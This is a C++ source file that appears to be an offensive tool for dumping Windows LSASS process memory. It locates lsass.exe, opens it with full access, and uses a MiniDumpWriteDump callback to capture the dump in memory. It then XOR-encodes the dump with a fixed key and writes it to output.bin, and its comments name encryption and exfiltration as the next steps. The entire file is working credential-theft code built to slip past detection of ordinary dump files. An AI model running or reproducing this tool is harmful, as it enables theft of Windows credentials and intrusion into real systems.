#include <windows.h>
#include <DbgHelp.h>
#include <iostream>
#include <TlHelp32.h>
#include <processsnapshot.h>
#include <fstream>
#include <vector>
#include <string>
#pragma comment (lib, "Dbghelp.lib")

using namespace std;

// Buffer for saving the minidump
LPVOID dumpBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 * 1024 * 75);
DWORD bytesRead = 0;

void XORBuffer(LPVOID buffer, size_t bufferSize, unsigned char key) {
	unsigned char* byteBuffer = (unsigned char*)buffer;
	for (size_t i = 0; i < bufferSize; i++) {
		byteBuffer[i] ^= key;
	}
}

BOOL WriteBufferToFile(LPVOID buffer, size_t bufferSize, const char* filePath) {
	HANDLE hFile = CreateFileA(filePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		return FALSE;
	}

	DWORD bytesWritten;
	BOOL result = WriteFile(hFile, buffer, bufferSize, &bytesWritten, NULL);
	CloseHandle(hFile);
	return result;
}


BOOL CALLBACK minidumpCallback(
	__in     PVOID callbackParam,
	__in     const PMINIDUMP_CALLBACK_INPUT callbackInput,
	__inout  PMINIDUMP_CALLBACK_OUTPUT callbackOutput
)
{
	LPVOID destination = 0, source = 0;
	DWORD bufferSize = 0;

	switch (callbackInput->CallbackType)
	{
	case IoStartCallback:
		callbackOutput->Status = S_FALSE;
		break;

		// Gets called for each lsass process memory read operation
	case IoWriteAllCallback:
		callbackOutput->Status = S_OK;

		// A chunk of minidump data that's been jus read from lsass. 
		// This is the data that would eventually end up in the .dmp file on the disk, but we now have access to it in memory, so we can do whatever we want with it.
		// We will simply save it to dumpBuffer.
		source = callbackInput->Io.Buffer;

		// Calculate location of where we want to store this part of the dump.
		// Destination is start of our dumpBuffer + the offset of the minidump data
		destination = (LPVOID)((DWORD_PTR)dumpBuffer + (DWORD_PTR)callbackInput->Io.Offset);

		// Size of the chunk of minidump that's just been read.
		bufferSize = callbackInput->Io.BufferBytes;
		bytesRead += bufferSize;

		RtlCopyMemory(destination, source, bufferSize);

		printf("[+] Minidump offset: 0x%x; length: 0x%x\n", callbackInput->Io.Offset, bufferSize);
		break;

	case IoFinishCallback:
		callbackOutput->Status = S_OK;
		break;

	default:
		return true;
	}
	return TRUE;
}

int main() {
	DWORD lsassPID = 0;
	DWORD bytesWritten = 0;
	HANDLE lsassHandle = NULL;
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	LPCWSTR processName = L"";
	PROCESSENTRY32 processEntry = {};
	processEntry.dwSize = sizeof(PROCESSENTRY32);

	// Get lsass PID
	if (Process32First(snapshot, &processEntry)) {
		while (_wcsicmp(processName, L"lsass.exe") != 0) {
			Process32Next(snapshot, &processEntry);
			processName = processEntry.szExeFile;
			lsassPID = processEntry.th32ProcessID;
		}
		printf("[+] lsass PID=0x%x\n", lsassPID);
	}

	lsassHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, lsassPID);

	// Set up minidump callback
	MINIDUMP_CALLBACK_INFORMATION callbackInfo;
	ZeroMemory(&callbackInfo, sizeof(MINIDUMP_CALLBACK_INFORMATION));
	callbackInfo.CallbackRoutine = &minidumpCallback;
	callbackInfo.CallbackParam = NULL;

	// Dump lsass
	BOOL isDumped = MiniDumpWriteDump(lsassHandle, lsassPID, NULL, MiniDumpWithFullMemory, NULL, NULL, &callbackInfo);

	if (isDumped)
	{
		// At this point, we have the lsass dump in memory at location dumpBuffer - we can do whatever we want with that buffer, i.e encrypt & exfiltrate
		unsigned char key = 0xAA; // Example XOR key
		XORBuffer(dumpBuffer, 1024 * 1024 * 75, key);

		const char* filePath = "output.bin";
		if (WriteBufferToFile(dumpBuffer, 1024 * 1024 * 75, filePath)) {
			printf("Buffer written to %s successfully.\n", filePath);
		}
		else {
			printf("Failed to write buffer to %s.\n", filePath);
		}

		HeapFree(GetProcessHeap(), 0, dumpBuffer);
	}

	return 0;
}